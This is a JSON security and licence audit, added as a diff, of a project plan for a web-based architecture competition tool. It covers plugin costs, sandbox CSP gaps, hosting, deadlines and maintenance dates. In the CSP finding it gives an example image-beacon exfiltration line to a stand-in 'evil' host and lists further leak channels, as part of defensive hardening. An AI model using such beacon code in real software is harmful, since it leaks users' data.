@@ -1,0 +1,330 @@
+{
+ "expert_role": "Security and licence gatekeeper auditing cited sources (supply chain, sandboxing, licences, maintenance, token cost)",
+ "previous_round": [
+  {
+   "item": "MAJOR Hosting split: GitHub Pages SPA + Cloudflare Pages sandbox + Worker proxy",
+   "status": "addressed",
+   "residue": "The plan now uses Workers static assets with a 1-hour spike due 28 Oct, but the spike has not been run. The sandbox CSP still has gaps (see finding 2). One Worker serving both the SPA and the /api proxy needs run_worker_first set for /api/*, because navigation requests skip the Worker script."
+  },
+  {
+   "item": "MAJOR Core sequencing: precomputed citations depend on Docling",
+   "status": "addressed",
+   "residue": "Sending PDFs straight to the Batch API is verified against the Citations docs. Sending each page as an image roughly adds image tokens on top of the text tokens, and a cheaper path exists (see finding 5)."
+  },
+  {
+   "item": "MAJOR Core schedule 19.5 person-days vs 18 working days, no spikes",
+   "status": "addressed",
+   "residue": "Re-baselined to 21.5 days with a cut list down to 18.0 days, but that leaves zero buffer. The VTC registration deadline (29 Oct) and reading the full brief are not in the schedule."
+  },
+  {
+   "item": "MINOR React pin for R3F",
+   "status": "addressed",
+   "residue": "Verified on npm: R3F 9.8.2 peer range is react >=19 <19.4, and React latest is 19.3.1. React canary is still 19.3.x, so the risk is not imminent."
+  },
+  {
+   "item": "MINOR Node pin via .nvmrc on Windows",
+   "status": "partly",
+   "residue": "The pinning tool is now fnm, but fnm depends on a profile hook that agent shells may not load. A system-wide Node 24 install would be more reliable (finding 7)."
+  },
+  {
+   "item": "MINOR AI Gateway",
+   "status": "addressed"
+  },
+  {
+   "item": "MINOR Claude Code plugin list",
+   "status": "partly",
+   "residue": "The plugins are now named. However, security-guidance runs Opus reviews on every turn and every commit, which works against the token goal (finding 1). pyright-lsp needs a binary that is not installed."
+  },
+  {
+   "item": "MINOR Token-saving levers",
+   "status": "addressed",
+   "residue": "Verified in the docs: context: fork, model, background (v2.1.218+), the 1,536-character description cap, /skill-doctor (v2.1.252+), and SUBAGENT_MODEL_FORCE (v2.1.257+)."
+  },
+  {
+   "item": "MINOR Impeccable supply chain",
+   "status": "partly",
+   "residue": "--no-hooks applies to that run only and the choice is not recorded, so a later install or update offers the hook again (finding 6)."
+  },
+  {
+   "item": "MINOR Image model ids and pricing",
+   "status": "addressed"
+  },
+  {
+   "item": "MINOR OpenAI parity in evidence path",
+   "status": "addressed"
+  },
+  {
+   "item": "MINOR Accessibility (axe)",
+   "status": "addressed",
+   "residue": "@axe-core/playwright 4.14.0 is MPL-2.0 and needs Node >=22.12 (verified)."
+  },
+  {
+   "item": "MINOR Python version drift (pyodide venv CI)",
+   "status": "addressed"
+  }
+ ],
+ "findings": [
+  {
+   "severity": "MAJOR",
+   "item": "security-guidance plugin in the token-saving allow-list",
+   "issue": "The README and hooks.json for v2.0.15 show four hooks: SessionStart, UserPromptSubmit, PostToolUse and Stop. On every Stop (each finished turn) the plugin sends the git diff to the newest Opus. On every git commit or push it starts an agentic Opus reviewer. On session start it may build a venv at ~/.claude/security and pip-install claude_agent_sdk. The reviews run on the user's Claude sign-in by default, so they use up the same plan limits the team already hit. The packet recommends the plugin as a cheap safety add-on and never mentions this cost.",
+   "fix": "Set ENABLE_STOP_REVIEW=0 by default, and set SECURITY_REVIEW_MODEL and SG_AGENTIC_MODEL to Sonnet 5.5 (claude-sonnet-5-5). Turn the commit review on only for branches that touch the key proxy, the sandbox or auth. Alternatively, keep only the pattern warnings (ENABLE_CODE_SECURITY_REVIEW=0) and run /security-review by hand on those PRs. Compare /usage before and after installing. Add the SessionStart pip install to the supply-chain review."
+  },
+  {
+   "severity": "MAJOR",
+   "item": "Sandbox origin CSP: 'sandbox allow-scripts' plus connect-src 'none'",
+   "issue": "MDN lists what connect-src controls: fetch, fetchLater, XHR, WebSocket, EventSource, sendBeacon and a[ping]. Image, style, font and media loads fall under other directives. A community module that receives user geometry over postMessage can therefore still send it out, for example with new Image().src='https://evil/?d=…'. MDN's directive list has no webrtc directive, so RTCPeerConnection or STUN traffic is a further channel that the sandbox does not obviously block. The isolation claim is weaker than the packet states.",
+   "fix": "On the sandbox origin, send: Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src with the pinned module bundle (by sha256 or exact path); img-src data: blob:; style-src 'self' 'unsafe-inline' only if needed; form-action 'none'; base-uri 'none'; frame-ancestors set to the app origin. Never grant allow-popups or allow-top-navigation. Add an exfiltration test to the spike covering an img beacon, CSS url(), RTCPeerConnection and window.open. Run any module that handles user geometry declaratively or in QuickJS, which has no network access."
+  },
+  {
+   "severity": "MAJOR",
+   "item": "Competition logistics missing from the schedule",
+   "issue": "Verified on architecturecompetitions.com/vancouvertallchallenge: registration closes 29 Oct 2026, Q&A closes 3 Nov, submission is due 30 Nov at 23:59 London time, and entries are judged anonymously. The page does not state the board count, board size or the format of the site model. The packet designs the A2 spike and the import priorities around 'four A2 boards' and an unknown model format, and lists registration only as UNRESOLVED.",
+   "fix": "Add a hard task to register and download the brief and site pack by 28 Oct. Confirm the board count, size and orientation before the A2 page.pdf spike. Run the importer on the official site model in week 1, and reorder the .3dm, OBJ and IFC priorities to match its format. Send any open questions to Q&A before 3 Nov."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Core schedule buffer",
+   "issue": "Four cuts bring the plan to exactly 18.0 person-days against 18 working days, or 17 if Remembrance Day is taken off. The plan assumes one full-time person-equivalent while the two students carry other courses. Any slip in a spike breaks the 13 Nov deadline.",
+   "fix": "Choose two more pre-approved cuts now, for example Plot cards replaced by plain tables (-0.5 day) and zundo replaced by snapshot-only undo (-0.5 day). Re-check progress at a fixed checkpoint on 3 Nov."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Citations token cost of sending raw PDFs",
+   "issue": "The PDF docs say each page is processed as both text and image: 1,500-3,000 text tokens per page plus image tokens. For text-extractable by-laws, the image tokens are pure overhead. The pricing page also says models from Claude 4.7 on use a newer tokenizer that produces about 30% more tokens, so older per-page estimates may run low.",
+   "fix": "For text PDFs, extract the text locally, one block per page. Send it to the API as a custom-content document (citations come back as content_block_location, where the block index is the page) or as one plain-text document per page (char_location). Do not commit the extracted text. Keep PDF input only for pages that need tables or figures read. Run count_tokens on claude-sonnet-5-5 before batching."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Impeccable --no-hooks",
+   "issue": "The README says --no-hooks 'skips the hook for that run only, without recording the choice'. The hook is the default on Claude Code, and the saved choice lives in a gitignored, per-developer .impeccable/config.local.json. A later npx impeccable update, or the second student's install, can bring the hook back.",
+   "fix": "Pass --no-hooks on every install and update on both machines. Add a pre-commit or CI check that fails if an Impeccable hook appears in .claude/settings*.json. Also commit telemetry: false in .impeccable/config.json."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Node toolchain via fnm in agent shells",
+   "issue": "fnm puts Node on PATH through a profile hook (fnm env --use-on-cd). Claude Code's PowerShell tool runs with -NonInteractive, and its Git Bash tool loads a different profile, so node may be missing or the wrong version in agent shells. That would cost tokens on retry loops.",
+   "fix": "Install Node 24 system-wide with the official MSI so it is on PATH in every shell. Keep .node-version and the engines field (>=22.12 <25) for CI. Use fnm only if a second Node version is really needed; in that case run fnm default 24 and add its default alias directory to the user PATH."
+  },
+  {
+   "severity": "MINOR",
+   "item": "pyright-lsp prerequisite",
+   "issue": "The marketplace entry starts the command 'pyright-langserver --stdio'. Neither Node nor pyright is installed, and the packet's LSP risk note mentions only typescript-language-server.",
+   "fix": "After installing Node, run npm i -g pyright typescript-language-server typescript, or pip install pyright. Then confirm that /plugin reports both LSP servers as running."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Context7 plugin publisher and data flow",
+   "issue": "The packet left this unchecked. The official marketplace lists context7 with author Upstash and the tag 'community-managed'. It connects to the hosted remote MCP at mcp.context7.com, so queries leave the machine, and its backend is closed.",
+   "fix": "Record Upstash as a third-party publisher. Put only library names and API questions in queries, never project code or keys. Keep it enabled but invoke it on demand only."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Stale or unresolved maintenance facts",
+   "issue": "Commit and release Atom feeds give: coi-serviceworker last commit 2023-12-09 (about 3 years); Real-ESRGAN last commit 2024-04-02; zundo main branch last commit 2025-04-29 (the critique's pushed_at of 2026-01-30 probably reflects a push to another branch); NodePen main last commit 2026-10-19, which is active. Observable Plot 0.6.17 was published on 2025-02-14; the 2026-04-12 feed date is a later edit of the release notes, not a new release.",
+   "fix": "Update the last_activity fields. Close the Plot UNVERIFIED flag. Mark coi-serviceworker and Real-ESRGAN as unmaintained-but-stable: vendor coi-serviceworker (MIT, one file) and pin the Real-ESRGAN binary by hash."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Pyodide spike risk for pvlib and PyNite",
+   "issue": "Checked against the Pyodide 314.0.7 lock file: all of pvlib 0.16.1's runtime dependencies are bundled (numpy 2.4.6, pandas 3.0.2, scipy 1.18.0, h5py 3.13.0, requests, pytz). PyNiteFEA 3.2.0 needs prettytable, which is not bundled but is pure Python. Whether pvlib works with pandas 3.0 is unverified. pvlib.iotools needs network access, which faces CORS limits in the browser.",
+   "fix": "Lower the spike risk in the flag. Test pandas 3 compatibility in pyodide venv. Never call iotools at runtime; precompute the weather data (see missing)."
+  },
+  {
+   "severity": "MINOR",
+   "item": "Single Worker serving both the SPA and the key proxy",
+   "issue": "The Cloudflare SPA routing docs say navigation requests (Sec-Fetch-Mode: navigate) skip the Worker script from compatibility date 2025-04-01. The _headers docs say _headers do not apply to Worker-generated responses. Without explicit routing, proxy routes and CORS headers can be misconfigured.",
+   "fix": "Set assets.run_worker_first to [\"/api/*\"]. Set CORS and CSP headers in code on Worker responses. Add both checks to the 1-hour spike."
+  }
+ ],
+ "false_assumptions": [
+  {
+   "claim": "security-guidance is a low-overhead addition to a token-saving plugin allow-list.",
+   "why_false": "By default it runs an LLM diff review on the newest Opus at every Stop, an agentic Opus commit or push reviewer, and a SessionStart pip install of claude_agent_sdk. All of it uses the user's Claude sign-in.",
+   "correction": "Disable the Stop review (ENABLE_STOP_REVIEW=0), move the reviews to Sonnet with SECURITY_REVIEW_MODEL and SG_AGENTIC_MODEL, and enable commit review only for security-sensitive branches.",
+   "evidence": "https://raw.githubusercontent.com/anthropics/claude-plugins-official/main/plugins/security-guidance/README.md ; hooks/hooks.json (SessionStart, UserPromptSubmit, PostToolUse, Stop); hooks/ensure_agent_sdk.py"
+  },
+  {
+   "claim": "CSP 'sandbox allow-scripts' plus connect-src 'none' keeps community modules from sending out data.",
+   "why_false": "connect-src covers only fetch, fetchLater, XHR, WebSocket, EventSource, sendBeacon and a[ping]. Image, style, font and media loads fall back to default-src, which the packet does not set. MDN lists no webrtc directive.",
+   "correction": "Use default-src 'none' with narrow script-src and img-src (data: blob:), form-action 'none' and base-uri 'none'. Spike-test image-beacon and WebRTC exfiltration, and use QuickJS or declarative modules for geometry-handling code.",
+   "evidence": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src ; https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy"
+  },
+  {
+   "claim": "Installing Impeccable with --no-hooks keeps its hook off.",
+   "why_false": "The README says --no-hooks skips the hook for that run only and does not record the choice. The hook is the default on Claude Code, and the saved choice is per developer in a gitignored config.local.json.",
+   "correction": "Repeat --no-hooks on every install and update on both machines, and check settings files for the hook in CI.",
+   "evidence": "https://github.com/pbakaus/impeccable README (install and hooks section)"
+  },
+  {
+   "claim": "Observable Plot 0.6.17 has conflicting release dates (possibly April 2026).",
+   "why_false": "npm time and the releases Atom feed both give a publish date of 2025-02-14. The feed's 2026-04-12 <updated> value is a later edit of the release entry.",
+   "correction": "The last release is 0.6.17, published 14 Feb 2025 (20 months ago). The latest commit on main is 2026-09-01.",
+   "evidence": "https://registry.npmjs.org/@observablehq/plot (time 0.6.17: 2025-02-14T16:15:29Z); https://github.com/observablehq/plot/releases.atom"
+  },
+  {
+   "claim": "zundo's repo was last pushed 2026-01-30, which suggests some recent activity.",
+   "why_false": "The commit feed for the main branch shows the last commit on 2025-04-29. GitHub's pushed_at counts pushes to any branch, and no release has followed since 2024-11-17.",
+   "correction": "Treat zundo as dormant since April 2025 (code) and November 2024 (release); vendoring it is the right plan.",
+   "evidence": "https://github.com/charkour/zundo/commits/main.atom (latest 2025-04-29T15:15:14Z); https://registry.npmjs.org/zundo"
+  }
+ ],
+ "missing": [
+  "Weather data source and licence for pvlib or energy cards, for example a Vancouver CWEC or EPW file precomputed at build time. pvlib.iotools must not be called from the browser.",
+  "A test of the sandbox origin against exfiltration: image beacon, CSS url(), RTCPeerConnection, window.open and navigation.",
+  "A baseline token measurement (/usage, /context) before and after installing each plugin, so the token-saving claims can be checked.",
+  "VTC registration by 28-29 Oct, plus the board count, size and site-model format from the full brief.",
+  "The content of the Explore subagent file (.claude/agents/Explore.md with model: haiku) and the CLAUDE.md effort table: named but not drafted.",
+  "A data-handling note for user massing screenshots sent to OpenAI image edits (retention and organisation verification), shown to users before the first render.",
+  "Platform licence decision (target 30 Oct) is still open. It determines whether the Ladybug (AGPL) plugin and cohort code can be accepted."
+ ],
+ "gate": {
+  "pass": true,
+  "conditions": [
+   "Configure security-guidance before installing it: ENABLE_STOP_REVIEW=0 and the review models set to Sonnet, or pattern-only. Record /usage before and after.",
+   "Harden the sandbox-origin CSP (default-src 'none' plus a narrow script-src and img-src) and add the exfiltration tests to the hosting spike due 28 Oct.",
+   "Register for VTC and download the brief and site pack by 28 Oct; confirm the board spec before the A2 spike and run the importers on the site model.",
+   "Repeat Impeccable --no-hooks on every install and update and add a hook-presence check.",
+   "Install Node 24 so it is on PATH in Claude Code's PowerShell and Git Bash tools, and install the pyright and typescript-language-server binaries.",
+   "Correct the maintenance dates (Plot, zundo, NodePen, coi-serviceworker, Real-ESRGAN) and close the resolved flags."
+  ]
+ },
+ "verdict": "The packet is sound and usable. Versions, licences and prices I re-checked on npm, PyPI, the Anthropic pricing page and the vendor docs match, and all three previous MAJOR items are addressed. Three new MAJOR problems remain. First, the recommended security-guidance plugin by default runs an Opus review after every turn and on every commit, which defeats the token-saving goal. Second, the sandbox's 'connect-src none' still lets a module send user geometry out through image loads and probably WebRTC. Third, VTC registration closes on 29 Oct and the board spec is unconfirmed, yet neither is scheduled. The schedule also has zero buffer. The team can start building now if the gate conditions are met during the first week.",
+ "sources_checked": [
+  {
+   "url": "https://registry.npmjs.org/ (vite, react, @react-three/fiber, drei, zundo, zustand, @xyflow/react, @observablehq/plot, suncalc, web-ifc, @thatopen/components, manifold-3d, vega-lite, vega-functions, pyodide, shadcn, @axe-core/playwright, three-mesh-bvh, maplibre-gl, yjs, supabase-js, openai, @anthropic-ai/sdk, vitest, @playwright/test, quickjs-emscripten, jose)",
+   "ok": true,
+   "note": "Versions, licences and peer ranges match the packet. R3F peers react >=19 <19.4; Vitest engines are ^22.12 || ^24 || >=26; vega-functions latest is 6.2.0; suncalc has no licence field."
+  },
+  {
+   "url": "https://pypi.org/pypi/{ladybug-core,honeybee-core,pvlib,openstudio,PyNiteFEA,fastapi,docling,pyodide-build,ifcopenshell}/json",
+   "ok": true,
+   "note": "ladybug-core and honeybee-core are AGPL-3.0; pvlib is BSD-3; PyNite is MIT; ifcopenshell is LGPL-3.0+. Versions match."
+  },
+  {
+   "url": "https://cdn.jsdelivr.net/pyodide/v314.0.7/full/pyodide-lock.json",
+   "ok": true,
+   "note": "All pvlib runtime dependencies are bundled; prettytable (needed by PyNite) is not."
+  },
+  {
+   "url": "https://platform.claude.com/docs/en/about-claude/pricing",
+   "ok": true,
+   "note": "Sonnet 5.5 $2/$10 per MTok, Opus 5.5 $4/$20, Haiku 5.5 $0.10, rising to $0.50 above 100k. Hits cost 0.05x on 5.5 models; Batch is 50% off. The newer tokenizer produces about 30% more tokens. The packet's arithmetic checks out."
+  },
+  {
+   "url": "https://platform.claude.com/docs/en/build-with-claude/citations",
+   "ok": true,
+   "note": "cited_text is not billed; citations are incompatible with structured outputs; scanned PDFs cannot be cited; custom-content block citations are available."
+  },
+  {
+   "url": "https://platform.claude.com/docs/en/build-with-claude/pdf-support",
+   "ok": true,
+   "note": "600 pages (100 below 1M context), 32 MB; each page is sent as text plus image; 1,500-3,000 text tokens per page."
+  },
+  {
+   "url": "https://code.claude.com/docs/en/skills",
+   "ok": true,
+   "note": "context: fork, model, background (v2.1.218), 1,536-character cap, /skill-doctor (v2.1.252), 500-line tip."
+  },
+  {
+   "url": "https://code.claude.com/docs/en/sub-agents",
+   "ok": true,
+   "note": "Explore uses the main model; a project Explore subagent overrides it; FORCE needs v2.1.257."
+  },
+  {
+   "url": "https://code.claude.com/docs/en/model-config",
+   "ok": true,
+   "note": "opusplan confirmed; 5.5 models default to medium effort; thinking cannot be turned off."
+  },
+  {
+   "url": "https://raw.githubusercontent.com/anthropics/claude-plugins-official/main/.claude-plugin/marketplace.json",
+   "ok": true,
+   "note": "315 plugins. typescript-lsp, pyright-lsp, frontend-design, skill-creator, security-guidance and mcp-server-dev are by Anthropic; context7 is by Upstash, tagged community-managed and uses a remote MCP."
+  },
+  {
+   "url": "https://raw.githubusercontent.com/anthropics/claude-plugins-official/main/plugins/security-guidance/README.md",
+   "ok": false,
+   "note": "Contradicts the packet's implied low cost: Opus review on Stop and commit, plus a SessionStart pip install."
+  },
+  {
+   "url": "https://github.com/pbakaus/impeccable",
+   "ok": true,
+   "note": "Apache-2.0, 84.1k stars. --no-hooks applies per run and is not recorded; the roll request is always sent; there is a binary download."
+  },
+  {
+   "url": "https://developers.cloudflare.com/workers/static-assets/headers/",
+   "ok": true,
+   "note": "100 rules, 2,000 characters per line, not applied to Worker responses; behaviour on the SPA fallback is not stated."
+  },
+  {
+   "url": "https://developers.cloudflare.com/workers/static-assets/routing/single-page-application/",
+   "ok": true,
+   "note": "Navigation requests skip the Worker; use run_worker_first for /api/*."
+  },
+  {
+   "url": "https://developers.cloudflare.com/workers/platform/limits/",
+   "ok": true,
+   "note": "100k requests/day, 10 ms CPU (network wait excluded), 20,000 files of 25 MiB."
+  },
+  {
+   "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox",
+   "ok": true,
+   "note": "Not supported in meta; sandboxes the requested resource; Baseline since 2016."
+  },
+  {
+   "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src",
+   "ok": false,
+   "note": "Covers only script network APIs; image and WebRTC channels are not covered, so connect-src 'none' alone is insufficient."
+  },
+  {
+   "url": "https://github.com/vega/vega/security/advisories/GHSA-m9rg-mr6g-75gm",
+   "ok": true,
+   "note": "vega-functions <=6.1.0, fixed in 6.1.1, High 7.2; the interpreter does not mitigate it."
+  },
+  {
+   "url": "https://supabase.com/pricing",
+   "ok": true,
+   "note": "Free tier limits and the 1-week pause confirmed; Pro from $25."
+  },
+  {
+   "url": "https://developers.openai.com/api/docs/guides/image-generation",
+   "ok": true,
+   "note": "sunburst and flare ids, size rules, quality up to max; organisation verification may be required; no per-image cost in the page text."
+  },
+  {
+   "url": "https://github.com/Schniz/fnm",
+   "ok": true,
+   "note": "GPL-3.0, 27.2k stars, .nvmrc and .node-version support; setup through a PowerShell profile hook; non-interactive shells not covered."
+  },
+  {
+   "url": "https://architecturecompetitions.com/vancouvertallchallenge",
+   "ok": true,
+   "note": "Registration 29 Oct, Q&A 3 Nov, submission 30 Nov 23:59 London time, max 4 per team, anonymous judging; board spec and model format not stated."
+  },
+  {
+   "url": "https://github.com/GenEnv/arch540-a1-toolkit",
+   "ok": true,
+   "note": "No LICENSE; 0 stars; last commit 2026-10-14 (Atom feed)."
+  },
+  {
+   "url": "https://reactflow.dev/learn/troubleshooting/remove-attribution",
+   "ok": true,
+   "note": "The maintainers ask users to subscribe to Pro before removing the attribution; it is a request, not an MIT licence term."
+  },
+  {
+   "url": "https://github.com/xyflow/xyflow",
+   "ok": true,
+   "note": "MIT, 38.7k stars."
+  },
+  {
+   "url": "https://github.com/giscus/giscus",
+   "ok": true,
+   "note": "MIT, 12.2k stars, 'still under active development'; last commit 2026-05-26 (Atom feed)."
+  },
+  {
+   "url": "https://github.com/{observablehq/plot,charkour/zundo,NodePen/nodepen,gzuidhof/coi-serviceworker,xinntao/Real-ESRGAN,anthropics/claude-plugins-official}/commits/*.atom",
+   "ok": true,
+   "note": "Plot 2026-09-01; zundo main 2025-04-29; NodePen 2026-10-19; coi-serviceworker 2023-12-09; Real-ESRGAN 2024-04-02; marketplace 2026-10-21. The GitHub REST API was rate-limited."
+  }
+ ]
+}
